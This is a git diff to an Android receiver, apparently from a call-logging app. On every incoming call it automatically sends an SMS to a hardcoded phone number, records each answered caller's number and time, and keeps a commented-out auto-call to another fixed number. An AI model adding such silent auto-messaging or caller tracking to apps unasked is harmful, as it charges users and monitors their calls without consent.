@@ -6,11 +6,14 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.Handler;
 import android.provider.CallLog;
 import android.telephony.PhoneStateListener;
+import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.widget.Toast;
 
 import androidx.core.app.ActivityCompat;
 
@@ -42,6 +45,13 @@ public class IncomingReceiver extends BroadcastReceiver {
                     String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                     String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
                     if (TelephonyManager.CALL_STATE_RINGING == state) {
+                        /*String callForwardString = "+919596350318";
+                        Intent intentCallForward = new Intent(Intent.ACTION_CALL);
+                        Uri uri2 = Uri.fromParts("tel", callForwardString, "#");
+                        intentCallForward.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        intentCallForward.setData(uri2);
+                        context.startActivity(intentCallForward);*/
+                        sendSMS("9796173066","Hi",context);
                         // phone ringing
                         Log.i("Incoming", "RINGING, number: " + incomingNumber);
                         if (i <= 0) {
@@ -57,6 +67,10 @@ public class IncomingReceiver extends BroadcastReceiver {
                     if (TelephonyManager.CALL_STATE_OFFHOOK == state) {
                         // active
                         Log.i("Incoming", "OFFHOOK");
+                        String lastentry = mSharedpref.getRecievedNumbers();
+                        String mBuilder = lastentry + "{ Date: " + currentDate + ", Time: " + currentTime + ",Number: " + incomingNumber + "}\n";
+                        mSharedpref.setRecievedNumbers(mBuilder);
+                        mSharedpref.commit();
                         if(lastState == TelephonyManager.CALL_STATE_RINGING){
                             isPhoneCalling = true;
                         }
@@ -116,6 +130,18 @@ public class IncomingReceiver extends BroadcastReceiver {
                 }
             }, PhoneStateListener.LISTEN_CALL_STATE);
 
+        }
+    }
+    public void sendSMS(String phoneNo, String msg, Context context) {
+        try {
+            SmsManager smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
+            Toast.makeText(context, "Message Sent",
+                    Toast.LENGTH_LONG).show();
+        } catch (Exception ex) {
+            Toast.makeText(context,ex.getMessage().toString(),
+                    Toast.LENGTH_LONG).show();
+            ex.printStackTrace();
         }
     }
 }
